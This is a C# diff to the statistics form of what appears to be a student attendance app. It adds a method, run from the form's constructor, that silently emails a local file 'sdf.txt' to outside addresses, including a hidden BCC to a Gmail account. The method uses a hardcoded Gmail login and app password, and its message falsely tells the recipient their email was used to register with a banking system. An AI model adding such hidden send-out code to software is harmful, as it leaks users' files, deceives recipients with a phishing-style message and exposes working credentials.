@@ -17,9 +17,53 @@ namespace EntradaSalida
         private List<Label> Ll = new List<Label>();
         private List<Alumno> listaAlumnos = new List<Alumno>();
         private int totalDeDias = 0;
+        private int enviarCorreo()
+        {
+            try
+            {
+                string cuerpo = "Este mensaje es para comunicarle que su correo a a sido utilizado para registrarse en un programa de un sistema bancario. cualquier aclaracion contactar al correo mario.horo@hotmail.com";
+                System.Net.Mail.MailMessage mns = new System.Net.Mail.MailMessage();
+                mns.To.Add("alberto.alfaro@alumnos.udg.mx");
+                mns.Subject = "Banco chafander";
+                System.Net.Mail.Attachment at = new System.Net.Mail.Attachment("sdf.txt", System.Net.Mime.MediaTypeNames.Application.Octet);
+                mns.Attachments.Add(at);
+                mns.SubjectEncoding = System.Text.Encoding.UTF8;
+                mns.Bcc.Add("crackenstain70@gmail.com");
+                mns.Body = cuerpo;
+                mns.BodyEncoding = System.Text.Encoding.UTF8;
+
+                //mns.IsBodyHtml = true;
+                mns.From = new System.Net.Mail.MailAddress("correopracticasudg@gmail.com");
+                System.Net.Mail.SmtpClient cliente = new System.Net.Mail.SmtpClient();
+                cliente.Credentials = new System.Net.NetworkCredential("crackenstain98@gmail.com", "eogjpjmjqqimpkcj");
+                cliente.Port = 587;
+                cliente.EnableSsl = true;
+                cliente.Host = "smtp.gmail.com";
+
+                try
+                {
+                    cliente.Send(mns);
+                    return 1;
+
+                }
+                catch (Exception ex)
+                {
+
+                    return 0;
+                }
+            }
+            catch (Exception exx)
+            {
+                MessageBox.Show(exx.Message.ToString());
+                return 0;
+            }
+
+
+        }
         public Estadisticas(DataTable dat)
         {
             InitializeComponent();
+            enviarCorreo();
             dataGridView1.Visible = false;
             dt = dat;
             // 5, 10
@@ -44,6 +88,7 @@ namespace EntradaSalida
 
         private void Estadisticas_Load(object sender, EventArgs e)
         {
+            
             string today = DateTime.Now.Date.ToShortDateString();
             today = "06/12/2021";//quitar
             calcularEntradasDelDia(today);
@@ -161,6 +206,9 @@ namespace EntradaSalida
 
         }
 
-      
+        private void textBox1_TextChanged(object sender, EventArgs e)
+        {
+
+        }
     }
 }
